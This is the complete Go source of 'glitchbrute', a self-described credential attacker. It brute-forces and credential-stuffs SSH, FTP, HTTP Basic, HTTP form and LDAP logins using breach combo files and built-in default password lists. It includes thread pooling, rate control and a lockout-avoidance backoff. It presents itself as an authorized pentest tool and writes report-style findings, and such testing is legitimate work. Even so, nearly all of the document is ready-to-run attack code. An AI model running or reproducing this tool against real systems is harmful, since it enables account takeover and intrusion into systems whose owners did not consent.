// glitchbrute/main.go
// GLITCHICONS — Unified Credential Attacker
//
// High-speed credential testing across multiple protocols.
// Uses goroutine pool + token bucket rate limiter.
//
// Protocols:
//   ssh        — SSH password brute force (golang.org/x/crypto/ssh)
//   ftp        — FTP credential test (raw TCP)
//   http-basic — HTTP Basic Authentication
//   http-form  — HTTP form-based login (POST)
//   ldap       — LDAP simple bind (raw BER)
//
// Usage:
//   glitchbrute ssh        --target ssh.corp.com --combo breach.txt
//   glitchbrute ftp        --target ftp.corp.com --users users.txt --passes top100.txt
//   glitchbrute http-basic --target https://api.corp.com/admin --users u.txt --passes p.txt
//   glitchbrute http-form  --target https://login.corp.com \
//                          --user-field email --pass-field password \
//                          --fail-string "Invalid credentials"
//   glitchbrute ldap       --target ldap.corp.com --users users.txt --passes top100.txt
//   glitchbrute --version

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

const Version = "4.1.0"

// ── Built-in default wordlists ────────────────────────────

var defaultUsers = []string{
	"admin", "administrator", "root", "user", "test", "guest", "operator",
	"support", "service", "backup", "ftp", "ftpuser", "anonymous", "deploy",
	"devops", "ubuntu", "ec2-user", "centos", "pi", "oracle", "postgres",
	"mysql", "www", "web", "nginx", "apache", "tomcat", "jenkins", "gitlab",
}

var defaultPasswords = []string{
	"", "admin", "password", "password1", "123456", "12345678", "1234",
	"admin123", "root", "toor", "pass", "pass123", "qwerty", "abc123",
	"letmein", "welcome", "login", "changeme", "default", "test", "test123",
	"1q2w3e", "dragon", "master", "hello", "monkey", "shadow", "sunshine",
	"princess", "iloveyou", "trustno1", "654321", "111111", "000000",
}

// ── Data types ────────────────────────────────────────────

type Config struct {
	Protocol   string
	Target     string
	Port       int
	Users      []string
	Passwords  []string
	Combos     [][2]string // user:pass pairs
	Threads    int
	RatePerSec int
	Timeout    int
	Output     string
	Verbose    bool
	// HTTP Form specific
	UserField  string
	PassField  string
	FailString string
	SuccessString string
}

type Attempt struct {
	User string
	Pass string
}

type Finding struct {
	Title       string  `json:"title"`
	Severity    string  `json:"severity"`
	CVSS        float64 `json:"cvss"`
	CWE         string  `json:"cwe"`
	Target      string  `json:"target"`
	Description string  `json:"description"`
	Evidence    string  `json:"evidence"`
	Remediation string  `json:"remediation"`
	Source      string  `json:"source"`
}

type ScanResult struct {
	Target          string    `json:"target"`
	Protocol        string    `json:"protocol"`
	Timestamp       string    `json:"timestamp"`
	TotalAttempts   int64     `json:"total_attempts"`
	ValidCreds      [][2]string `json:"valid_credentials"`
	DurationS       float64   `json:"duration_s"`
	AttemptsPerSec  float64   `json:"attempts_per_sec"`
	Findings        []Finding `json:"findings"`
	Version         string    `json:"scanner_version"`
}

// ── Rate Limiter ──────────────────────────────────────────

type RateLimiter struct {
	ticker *time.Ticker
	done   chan struct{}
}

func newRateLimiter(perSec int) *RateLimiter {
	if perSec <= 0 {
		perSec = 10
	}
	interval := time.Second / time.Duration(perSec)
	return &RateLimiter{
		ticker: time.NewTicker(interval),
		done:   make(chan struct{}),
	}
}

func (r *RateLimiter) Wait() {
	<-r.ticker.C
}

func (r *RateLimiter) Stop() {
	r.ticker.Stop()
}

// ── Lockout Detector ──────────────────────────────────────

type LockoutDetector struct {
	mu           sync.Mutex
	failStreak   int
	backoffUntil time.Time
	threshold    int
	backoffSec   int
}

func newLockoutDetector(threshold, backoffSec int) *LockoutDetector {
	return &LockoutDetector{threshold: threshold, backoffSec: backoffSec}
}

func (l *LockoutDetector) RecordFail() {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.failStreak++
	if l.failStreak >= l.threshold {
		l.backoffUntil = time.Now().Add(time.Duration(l.backoffSec) * time.Second)
		l.failStreak = 0
	}
}

func (l *LockoutDetector) RecordSuccess() {
	l.mu.Lock()
	l.failStreak = 0
	l.mu.Unlock()
}

func (l *LockoutDetector) Wait() {
	l.mu.Lock()
	until := l.backoffUntil
	l.mu.Unlock()
	if time.Now().Before(until) {
		time.Sleep(time.Until(until))
	}
}

// ── SSH Bruter ────────────────────────────────────────────

func trySSH(target string, port int, user, pass string, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", target, port)
	cfg  := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	client, err := ssh.Dial("tcp", addr, cfg)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

// ── FTP Bruter ────────────────────────────────────────────

func tryFTP(target string, port int, user, pass string, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", target, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	reader := bufio.NewReader(conn)
	// Read banner
	_, err = reader.ReadString('\n')
	if err != nil {
		return false
	}

	fmt.Fprintf(conn, "USER %s\r\n", user)
	resp, err := reader.ReadString('\n')
	if err != nil {
		return false
	}
	if !strings.HasPrefix(resp, "331") && !strings.HasPrefix(resp, "230") {
		return false
	}
	if strings.HasPrefix(resp, "230") {
		return true
	}

	fmt.Fprintf(conn, "PASS %s\r\n", pass)
	resp, err = reader.ReadString('\n')
	if err != nil {
		return false
	}
	return strings.HasPrefix(resp, "230")
}

// ── HTTP Basic Bruter ─────────────────────────────────────

func tryHTTPBasic(target, user, pass string, timeout time.Duration) bool {
	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(user, pass)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; glitchbrute/"+Version+")")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Success: 200, 201, 202, 301, 302 (not 401 or 403)
	return resp.StatusCode != 401 && resp.StatusCode != 403
}

// ── HTTP Form Bruter ──────────────────────────────────────

func tryHTTPForm(
	target, user, pass string,
	userField, passField string,
	failString, successString string,
	timeout time.Duration,
) bool {
	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Follow up to 3 redirects
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	form := url.Values{}
	form.Set(userField, user)
	form.Set(passField, pass)

	req, err := http.NewRequest("POST", target, strings.NewReader(form.Encode()))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; glitchbrute/"+Version+")")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Read response body (limited)
	buf := make([]byte, 8192)
	n, _ := resp.Body.Read(buf)
	body := string(buf[:n])

	// Check indicators
	if failString != "" && strings.Contains(body, failString) {
		return false
	}
	if successString != "" && strings.Contains(body, successString) {
		return true
	}

	// Default: redirect after POST = likely success (login redirect)
	return resp.StatusCode == 302 || resp.StatusCode == 301
}

// ── LDAP Bruter ───────────────────────────────────────────

func tryLDAP(target string, port int, user, pass string, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", target, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// Build LDAP BindRequest
	bindReq := buildLDAPBind(1, user, pass)
	_, err = conn.Write(bindReq)
	if err != nil {
		return false
	}

	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	if err != nil || n < 7 {
		return false
	}

	// Parse result code
	for i := 0; i < n-3; i++ {
		if buf[i] == 0x61 { // BindResponse
			for j := i + 2; j < n-2; j++ {
				if buf[j] == 0x0a && buf[j+1] == 0x01 {
					return buf[j+2] == 0x00 // resultCode 0 = success
				}
			}
		}
	}
	return false
}

func buildLDAPBind(msgID int, dn, password string) []byte {
	dnBytes  := []byte(dn)
	pwBytes  := []byte(password)
	auth     := append([]byte{0x80, byte(len(pwBytes))}, pwBytes...)
	body     := append([]byte{0x02, 0x01, 0x03, 0x04, byte(len(dnBytes))}, dnBytes...)
	body      = append(body, auth...)
	appReq   := append([]byte{0x60, byte(len(body))}, body...)
	msgIDBytes := []byte{0x02, 0x01, byte(msgID)}
	envelope := append(msgIDBytes, appReq...)
	return append([]byte{0x30, byte(len(envelope))}, envelope...)
}

// ── Core Brute Engine ─────────────────────────────────────

func runBrute(cfg *Config) ScanResult {
	start  := time.Now()
	result := ScanResult{
		Target:    cfg.Target,
		Protocol:  cfg.Protocol,
		Timestamp: start.UTC().Format(time.RFC3339),
		Findings:  []Finding{},
		Version:   Version,
	}

	// Build attempt list
	var attempts []Attempt
	if len(cfg.Combos) > 0 {
		for _, c := range cfg.Combos {
			attempts = append(attempts, Attempt{c[0], c[1]})
		}
	} else {
		for _, u := range cfg.Users {
			for _, p := range cfg.Passwords {
				attempts = append(attempts, Attempt{u, p})
			}
		}
	}

	if len(attempts) == 0 {
		fmt.Fprintln(os.Stderr, "[!] No credentials to test")
		return result
	}

	fmt.Printf("[*] glitchbrute v%s | %s | %s | %d attempts | %d threads | %d/sec\n",
		Version, cfg.Protocol, cfg.Target, len(attempts), cfg.Threads, cfg.RatePerSec)

	// Concurrency control
	sem      := make(chan struct{}, cfg.Threads)
	limiter  := newRateLimiter(cfg.RatePerSec)
	defer limiter.Stop()
	lockout  := newLockoutDetector(20, 5)

	var (
		wg           sync.WaitGroup
		mu           sync.Mutex
		totalAttempts int64
		validCreds   [][2]string
		stopFlag     int32
	)

	timeout := time.Duration(cfg.Timeout) * time.Second

	for _, attempt := range attempts {
		if atomic.LoadInt32(&stopFlag) == 1 {
			break
		}

		lockout.Wait()
		limiter.Wait()

		wg.Add(1)
		sem <- struct{}{}
		u, p := attempt.User, attempt.Pass

		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			atomic.AddInt64(&totalAttempts, 1)

			var success bool
			switch cfg.Protocol {
			case "ssh":
				success = trySSH(cfg.Target, cfg.Port, u, p, timeout)
			case "ftp":
				success = tryFTP(cfg.Target, cfg.Port, u, p, timeout)
			case "http-basic":
				success = tryHTTPBasic(cfg.Target, u, p, timeout)
			case "http-form":
				success = tryHTTPForm(cfg.Target, u, p,
					cfg.UserField, cfg.PassField,
					cfg.FailString, cfg.SuccessString, timeout)
			case "ldap":
				success = tryLDAP(cfg.Target, cfg.Port, u, p, timeout)
			}

			if success {
				lockout.RecordSuccess()
				fmt.Printf("[+] VALID: %s:%s\n", u, p)

				mu.Lock()
				validCreds = append(validCreds, [2]string{u, p})
				mu.Unlock()

				// Stop on first hit (configurable in future)
				atomic.StoreInt32(&stopFlag, 1)
			} else {
				lockout.RecordFail()
				if cfg.Verbose {
					fmt.Printf("[-] %s:%s\n", u, p)
				}
			}
		}()
	}

	wg.Wait()

	duration := time.Since(start).Seconds()
	result.TotalAttempts  = atomic.LoadInt64(&totalAttempts)
	result.ValidCreds     = validCreds
	result.DurationS      = duration
	if duration > 0 {
		result.AttemptsPerSec = float64(result.TotalAttempts) / duration
	}

	// Generate findings
	for _, cred := range validCreds {
		result.Findings = append(result.Findings, Finding{
			Title:    fmt.Sprintf("Valid Credential Found: %s — %s", cfg.Protocol, cred[0]),
			Severity: "CRITICAL",
			CVSS:     9.8,
			CWE:      "CWE-521",
			Target:   fmt.Sprintf("%s://%s", cfg.Protocol, cfg.Target),
			Description: fmt.Sprintf(
				"Valid credential pair found for %s on %s. "+
					"Username: '%s', Password: '%s'. "+
					"Tested in %.1f seconds (%d attempts).",
				cfg.Protocol, cfg.Target, cred[0], cred[1],
				duration, result.TotalAttempts,
			),
			Evidence: fmt.Sprintf(
				"Protocol: %s\nTarget: %s\nUsername: %s\nPassword: %s\n"+
					"Attempts: %d\nRate: %.0f/sec",
				cfg.Protocol, cfg.Target, cred[0], cred[1],
				result.TotalAttempts, result.AttemptsPerSec,
			),
			Remediation: "Change this credential immediately. " +
				"Implement account lockout after 5 failed attempts. " +
				"Enable MFA. Use a password manager to enforce unique strong passwords.",
			Source: "module:glitchbrute",
		})
	}

	// No valid creds finding
	if len(validCreds) == 0 && result.TotalAttempts > 0 {
		result.Findings = append(result.Findings, Finding{
			Title:       fmt.Sprintf("Credential Test: No Weak Passwords Found (%s)", cfg.Protocol),
			Severity:    "INFO",
			CVSS:        0.0,
			CWE:         "CWE-521",
			Target:      fmt.Sprintf("%s://%s", cfg.Protocol, cfg.Target),
			Description: fmt.Sprintf("Tested %d credential pairs — no weak passwords found.", result.TotalAttempts),
			Evidence:    fmt.Sprintf("Attempts: %d | Rate: %.0f/sec | Duration: %.1fs", result.TotalAttempts, result.AttemptsPerSec, duration),
			Remediation: "Continue monitoring for credential stuffing attacks.",
			Source:      "module:glitchbrute",
		})
	}

	fmt.Printf("[*] Done: %d attempts in %.1fs (%.0f/sec) | found=%d\n",
		result.TotalAttempts, duration, result.AttemptsPerSec, len(validCreds))
	return result
}

// ── Wordlist loaders ──────────────────────────────────────

func loadWordlist(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var words []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			words = append(words, line)
		}
	}
	return words, scanner.Err()
}

func loadComboFile(path string) ([][2]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var combos [][2]string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			combos = append(combos, [2]string{parts[0], parts[1]})
		}
	}
	return combos, scanner.Err()
}

// ── Main ──────────────────────────────────────────────────

func main() {
	// Subcommand routing
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	if os.Args[1] == "--version" || os.Args[1] == "-version" {
		fmt.Printf("glitchbrute v%s\n", Version)
		os.Exit(0)
	}

	protocol := os.Args[1]
	validProtocols := map[string]bool{
		"ssh": true, "ftp": true,
		"http-basic": true, "http-form": true,
		"ldap": true,
	}
	if !validProtocols[protocol] {
		fmt.Fprintf(os.Stderr, "Unknown protocol: %s\n", protocol)
		printUsage()
		os.Exit(1)
	}

	// Parse flags after subcommand
	fs := flag.NewFlagSet(protocol, flag.ExitOnError)

	target      := fs.String("target",         "",       "Target host or URL")
	port        := fs.Int("port",              0,        "Port (default: protocol default)")
	usersFile   := fs.String("users",          "",       "Username wordlist file")
	passFile    := fs.String("passes",         "",       "Password wordlist file")
	comboFile   := fs.String("combo",          "",       "Combo file (user:pass per line)")
	threads     := fs.Int("threads",           10,       "Concurrent goroutines")
	ratePerSec  := fs.Int("rate",              50,       "Attempts per second (rate limit)")
	timeout     := fs.Int("timeout",           8,        "Per-attempt timeout in seconds")
	output      := fs.String("output",         "",       "Output JSON file")
	verbose     := fs.Bool("verbose",          false,    "Show all attempts")
	userField   := fs.String("user-field",     "username", "HTTP form username field name")
	passField   := fs.String("pass-field",     "password", "HTTP form password field name")
	failString  := fs.String("fail-string",    "",       "String indicating failed login")
	successStr  := fs.String("success-string", "",       "String indicating successful login")

	fs.Parse(os.Args[2:])

	if *target == "" {
		fmt.Fprintln(os.Stderr, "[!] --target is required")
		os.Exit(1)
	}

	// Default ports
	defaultPorts := map[string]int{
		"ssh": 22, "ftp": 21, "ldap": 389,
		"http-basic": 80, "http-form": 80,
	}
	if *port == 0 {
		*port = defaultPorts[protocol]
	}

	cfg := &Config{
		Protocol:      protocol,
		Target:        *target,
		Port:          *port,
		Threads:       *threads,
		RatePerSec:    *ratePerSec,
		Timeout:       *timeout,
		Output:        *output,
		Verbose:       *verbose,
		UserField:     *userField,
		PassField:     *passField,
		FailString:    *failString,
		SuccessString: *successStr,
	}

	// Load credentials
	if *comboFile != "" {
		combos, err := loadComboFile(*comboFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Failed to load combo file: %v\n", err)
			os.Exit(1)
		}
		cfg.Combos = combos
	} else {
		// Users
		if *usersFile != "" {
			users, err := loadWordlist(*usersFile)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[!] Failed to load users: %v\n", err)
				os.Exit(1)
			}
			cfg.Users = users
		} else {
			cfg.Users = defaultUsers
			fmt.Printf("[*] No --users specified, using %d built-in usernames\n", len(defaultUsers))
		}

		// Passwords
		if *passFile != "" {
			passes, err := loadWordlist(*passFile)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[!] Failed to load passwords: %v\n", err)
				os.Exit(1)
			}
			cfg.Passwords = passes
		} else {
			cfg.Passwords = defaultPasswords
			fmt.Printf("[*] No --passes specified, using %d built-in passwords\n", len(defaultPasswords))
		}
	}

	// Run
	result := runBrute(cfg)

	// Output
	data, _ := json.MarshalIndent(result, "", "  ")
	if *output != "" {
		os.WriteFile(*output, data, 0644)
		fmt.Printf("[*] Results saved to %s\n", *output)
	} else {
		fmt.Println(string(data))
	}

	// Exit code 0 if any valid creds found
	if len(result.ValidCreds) > 0 {
		os.Exit(0)
	}
	os.Exit(2)
}

func printUsage() {
	fmt.Printf(`glitchbrute v%s — Unified Credential Attacker

AUTHORIZED USE ONLY. Test only systems you have permission to test.

Usage:
  glitchbrute <protocol> [flags]

Protocols:
  ssh         SSH password authentication
  ftp         FTP login test
  http-basic  HTTP Basic Authentication
  http-form   HTTP form-based login (POST)
  ldap        LDAP simple bind

Common Flags:
  --target         Target host or URL (required)
  --port           Port override (default: protocol default)
  --users          Username wordlist file
  --passes         Password wordlist file
  --combo          Combo file (user:pass per line)
  --threads        Concurrent goroutines (default: 10)
  --rate           Attempts per second (default: 50)
  --timeout        Per-attempt timeout seconds (default: 8)
  --output         Save results to JSON file
  --verbose        Show all attempt results

HTTP Form Extra:
  --user-field     Form username field name (default: username)
  --pass-field     Form password field name (default: password)
  --fail-string    String in body indicating failure
  --success-string String in body indicating success

Examples:
  glitchbrute ssh   --target ssh.corp.com --combo breach.txt --threads 20
  glitchbrute ftp   --target ftp.corp.com --users u.txt --passes p.txt
  glitchbrute ldap  --target ldap.corp.com --port 389 --users users.txt
  glitchbrute http-form --target https://login.corp.com \
              --user-field email --pass-field pwd \
              --fail-string "Wrong password" --rate 100
`, Version)
}
